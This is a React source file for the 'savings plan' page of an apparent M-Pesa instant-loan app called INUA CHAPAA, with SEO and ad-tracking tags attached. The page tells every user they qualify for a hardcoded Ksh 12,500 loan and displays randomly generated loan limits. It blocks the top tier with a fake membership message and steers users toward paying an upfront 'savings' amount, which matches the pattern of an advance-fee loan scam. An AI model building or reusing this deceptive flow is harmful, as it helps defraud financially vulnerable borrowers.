import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import '../styles/Savings.css';
import { Helmet } from "react-helmet-async";

<Helmet>
  {/* Primary SEO */}
  <title>INUA CHAPAA - Instant Mpesa Loans in Kenya</title>
  <meta name="description" content="Need fast cash? INUA CHAPAA offers instant mobile loans sent to your Mpesa account. Quick, safe, and hassle-free." />
  <meta name="keywords" content="Mpesa loan, instant loan Kenya, mobile loan app, INUA CHAPAA, emergency loan Kenya, online loans" />
  <meta name="author" content="INUA CHAPAA" />
  <link rel="canonical" href="https://inua-chapaa.com/" />

  {/* Open Graph (Facebook, WhatsApp, LinkedIn) */}
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://inua-chapaa.com/" />
  <meta property="og:title" content="INUA CHAPAA - Get Instant Mpesa Loans" />
  <meta property="og:description" content="Instant cash to Mpesa. Apply in minutes with INUA CHAPAA mobile loans." />
  <meta property="og:image" content="https://inua-chapaa.com/assets/social-banner.jpg" />

  {/* Twitter Card */}
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:url" content="https://inua-chapaa.com/" />
  <meta name="twitter:title" content="INUA CHAPAA - Fast Mpesa Loans in Kenya" />
  <meta name="twitter:description" content="Quick and easy mobile loans. Apply now and receive your funds via Mpesa." />
  <meta name="twitter:image" content="https://inua-chapaa.com/assets/social-banner.jpg" />

  {/* TikTok Preview (optional if you're embedding a video) */}
  <meta property="og:video" content="https://www.tiktok.com/@inua_chapaa/video/1234567890123456" />
  <meta property="og:video:type" content="text/html" />
  <meta property="og:video:width" content="325" />
  <meta property="og:video:height" content="576" />

  {/* Google Ads Global Site Tag */}
  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-XXXXXXXXX"></script>
  <script>
    {`
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'AW-XXXXXXXXX');
    `}
  </script>

  {/* Favicon + Manifest */}
  <link rel="icon" href="/favicon.ico" />
  <link rel="manifest" href="/manifest.json" />
</Helmet>


const Savings = () => {
  const navigate = useNavigate();
  const [name, setName] = useState('John Doe');
  const [selected, setSelected] = useState(null);
  const [error, setError] = useState(false);
  const [plans, setPlans] = useState([]);

  useEffect(() => {
    const stored = localStorage.getItem('name');
    if (stored) setName(stored);

    const getRandom = (min, max) => {
      const rand = Math.floor(Math.random() * (max - min + 1) + min);
      return rand - (rand % 10);
    };

    const savingsPlans = [
      { savings: 150, limit: getRandom(2500, 3500) },
      { savings: 170, limit: getRandom(4000, 5000) },
      { savings: 220, limit: getRandom(6000, 7000) },
      { savings: 300, limit: getRandom(7000, 10000) },
      { savings: 450, limit: getRandom(10000, 14000) },
      { savings: 950, limit: getRandom(14000, 19000) },
      { savings: 1550, limit: getRandom(20000, 25000) },
    ];
    setPlans(savingsPlans);
  }, []);

  const handleSelect = (plan) => {
    setSelected(plan);
    setError(plan.savings === 1550); // Error if highest tier selected
  };

  const handleProceed = () => {
    if (selected && !error) {
      localStorage.setItem('limit', selected.limit);
      navigate('/appdet');
    }
  };

  const fname = name.split(' ')[0];

  return (
    <div className="container">
      <h1>INUA CHAPAA</h1>
      <p className="subtitle">
        Dear <strong className="highlighted">{fname},</strong> you qualify for a loan of up to <strong>Ksh 12,500</strong>. Choose your savings plan to continue to loan application.
      </p>

      <div className="radio-group">
        {plans.map((plan) => (
          <label
            key={plan.savings}
            className={`radio-option ${selected?.savings === plan.savings ? 'selected' : ''}`}
          >
            <input
              type="radio"
              name="savings"
              value={plan.savings}
              onChange={() => handleSelect(plan)}
            />
            <div className="savings-amount">Ksh {plan.savings}</div>
            <div className="loan-limit">Loan limit: Ksh {plan.limit}</div>
          </label>
        ))}
      </div>

      <div className={`result ${error ? 'error' : ''}`}>
        {selected
          ? error
            ? 'Only existing members allowed'
            : `Your loan limit: Ksh ${selected.limit}`
          : 'Select a savings amount to see your loan limit'}
      </div>

      <div className="buttons">
        <button
          id="continueBtn"
          onClick={handleProceed}
          disabled={!selected || error}
        >
          Proceed
        </button>
      </div>
    </div>
  );
};

export default Savings;
